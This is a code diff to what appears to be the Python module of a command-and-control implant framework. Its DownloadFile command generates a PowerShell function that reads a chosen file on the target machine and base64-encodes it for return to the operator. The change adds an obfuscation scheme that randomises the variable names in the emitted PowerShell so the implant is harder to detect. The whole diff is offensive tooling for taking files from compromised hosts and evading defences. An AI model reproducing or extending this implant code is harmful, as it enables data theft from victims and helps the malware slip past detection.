@@ -8,6 +8,14 @@ class DownloadFile:
     type = "FD"
     args = "base64 target file"
     input = "download_file"
+    # this must be unique across ALL implants, any matching keys will be merged causing errors.
+    # To safely format this use the following format "<type>_variablename":"value" i.e.
+    #   fd_base64_var: base64filecontents
+    # Accessing this value will be done by using Jinja markup via the "mod_obf" dictionary in Jinja i.e.:
+    # Write-Host "Contents are: {{ mod_obf.fd_base64_var }}"
+    obfuscation_keypairs = {
+        "fd_base64_var": "base64file"
+        }
 
     def process_implant_response(self, data, args):
         """print("sub class")
@@ -36,10 +44,10 @@ class DownloadFile:
         var = '''
 function {{ ron.obf_download_file }} ($b){
     try {
-        $base64string = [Convert]::ToBase64String([IO.File]::ReadAllBytes($b))
-        $Script:tr = $base64string
+        ${{ mod_obf.fd_base64_var }} = [Convert]::ToBase64String([IO.File]::ReadAllBytes($b))
+        $global:tr = ${{ mod_obf.fd_base64_var }}
     } catch {
-        Script:tr = "0"
+        $global:tr = "0"
     }
 }'''
         return var
